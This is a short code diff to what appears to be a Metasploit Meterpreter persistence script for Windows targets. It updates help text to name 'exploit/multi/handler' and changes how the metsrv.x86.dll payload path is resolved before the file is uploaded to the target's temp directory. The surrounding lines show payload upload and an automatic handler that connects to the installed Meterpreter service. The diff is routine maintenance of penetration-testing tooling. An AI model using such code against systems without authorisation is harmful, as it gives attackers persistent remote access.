@@ -18,7 +18,7 @@ session = client
 opts = Rex::Parser::Arguments.new(
   "-h"  => [ false,  "This help menu"],
   "-r"  => [ false,  "Uninstall an existing Meterpreter service (files must be deleted manually)"],
-  "-A"  => [ false,  "Automatically start a matching multi/handler to connect to the service"]
+  "-A"  => [ false,  "Automatically start a matching exploit/multi/handler to connect to the service"]
 )
 
 # Exec a command and return the results
@@ -92,7 +92,8 @@ if client.platform =~ /win32|win64/
     to ||= from
     print_status(" >> Uploading #{from}...")
     fd = client.fs.file.new(tempdir + "\\" + to, "wb")
-    fd.write(::File.read(File.join(based, from), ::File.size(::File.join(based, from))))
+    path = (from == 'metsrv.x86.dll') ? MetasploitPayloads.meterpreter_path('metsrv','x86.dll') : File.join(based, from)
+    fd.write(::File.read(path, ::File.size(path)))
     fd.close
   end
 
@@ -116,7 +117,7 @@ if client.platform =~ /win32|win64/
   end
 
   #
-  # Setup the multi/handler if requested
+  # Setup the exploit/multi/handler if requested
   #
   if(autoconn)
     print_status("Trying to connect to the Meterpreter service at #{client.session_host}:#{rport}...")
